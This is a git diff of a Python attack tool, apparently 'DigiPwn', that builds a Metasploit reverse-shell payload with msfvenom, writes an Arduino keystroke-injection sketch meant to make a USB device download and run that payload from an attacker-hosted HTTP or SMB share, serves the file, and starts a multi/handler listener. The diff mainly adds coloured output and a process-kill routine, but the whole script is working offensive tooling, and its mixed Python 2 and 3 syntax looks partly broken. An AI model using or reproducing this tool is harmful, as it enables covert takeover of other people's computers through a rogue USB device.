@@ -1,17 +1,34 @@
-#	Created by Sharon Shaju
-#	Follow me on Instagram
-#		https://www.instagram.com/zero.overflow
-#	My GitHub
-#		https://github.com/zer0overflow/DigiPwn
-#
-#		Copyrights Reserverd! Do not use my code without mentioning me!
+#!/bin/python
+#===============================================================================#
+#										#
+#				!! Created by Sharon !!				#
+#			Follow me on Instagram:					#
+#				https://www.instagram.com/zero.overflow/	#
+#			My GitHub:						#
+#				https://www.github.com/zer0overflow/		#
+#										#
+#################################################################################
+
 import sys, os, threading
 from impacket import smbserver
+reset = '\033[32;0;0m'
+pos = '\033[32;1;40m[+]' + reset
+info = '\033[33;1;40m[!]' + reset
+neg = '\033[31;1;40m[-]' + reset
+
+def kill():
+        op = os.popen('lsof -i:445').read()
+        op = op.split('\n')
+        for line in op:
+                if 'python' in line:
+                        pid = line.split(' ')[2]
+                        os.system('kill -9 %s' % pid)
+	print reset
 
 def banner():
 	os.system('clear')
-	print('\n\n' + open('grafitti.txt', 'r').read())
-
+	print('\n\n\033[1;31;5m' + open('grafitti.txt', 'r').read())
+	print(reset)
 
 def usage():
 	banner()
@@ -25,8 +42,8 @@ def create_ino(code):
         cc = 'keystroke_inject.ino'
         f.write(code)
         f.close()
-        print(" [+] File saved to %s" % cc)
-        print(" [*] Open Arduino >> File >> Open >> %s" % cc)
+        print(pos + " File saved to %s" % cc)
+        print(pos + " Open Arduino >> File >> Open >> %s" % cc)
 
 def start_server(type):
                 if 'server' in os.listdir(os.getcwd()):
@@ -35,25 +52,26 @@ def start_server(type):
                         try:
                                 os.mkdir('server')
                         except Exception as e:
-                                print(' [!] Error %s continuing...' % e)
+                                print(info + ' Error %s continuing...' % e)
                                 pass
                 os.system('mv %s server/' % mal)
                 os.chdir('server/')
                 if type == 'SMB':
                         create_ino(smbcode)
-                        print(' [!] Starting the Samba Server...')
+                        print(info + ' Starting the Samba Server...')
                         server = smbserver.SimpleSMBServer()
 			server.addShare('MAL', os.getcwd())
                         try:
                                 server.start()
                         except Exception as e:
-                                print(' [-] Error! %s ' % e)
+                                print(neg + ' Error! %s ' % e)
                 else:
                         create_ino(httpcode)
                         os.system('python -m SimpleHTTPServer 3456')
 
 def main():
 	global mal, host, port, httpcode, smbcode
+
         try:
                 host = sys.argv[1]
                 port = sys.argv[2]
@@ -69,8 +87,8 @@ def main():
         except:
                 pass
         banner()
-        print(' [!] Generating payload')
-        os.system('msfvenom -p %s -f %s LHOST=%s  LPORT=%s  -o %s' % (payload, format, host, port, mal))
+        print(info + ' Generating payload')
+        os.popen('msfvenom -p %s -f %s LHOST=%s  LPORT=%s  -o %s' % (payload, format, host, port, mal))
         httpcode = '''
         /*
          *          Created by Sharon Shaju
@@ -133,7 +151,7 @@ void loop() {
   delay(100);
 }
 ''' % (host, mal)
-        if raw_input(' Do you want to start a metasploit stager and file hosting?[y/n] ').lower() == 'y':
+        if raw_input(info + ' Do you want to start a metasploit stager and file hosting?[y/n] ').lower() == 'y':
                 rc_file = open('msf.rc', 'w')
                 cmd = 'use multi/handler\n' + \
                         'set LHOST 0.0.0.0\n' + \
@@ -142,12 +160,20 @@ void loop() {
                         'run -j'
                 rc_file.write(cmd)
                 rc_file.close()
-                print(" [+] RC File created and saved to msf.rc . run \"msfconsole -r msf.rc\"")
+                print(pos + " RC File created and saved to msf.rc . run \"msfconsole -r msf.rc\"")
                 #print(filename)
                 thread = threading.Thread(target=start_server,args=("SMB",))
                 thread.start()
                 os.system('msfconsole -r msf.rc')
+		while 1:
+			try:
+				pass
+			except KeyboardInterrupt:
+				print(info  + ' Quitting...')
+				kill()
+				quit(-1)
         else:
+		print reset
                 exit()
 
 if __name__ == '__main__':
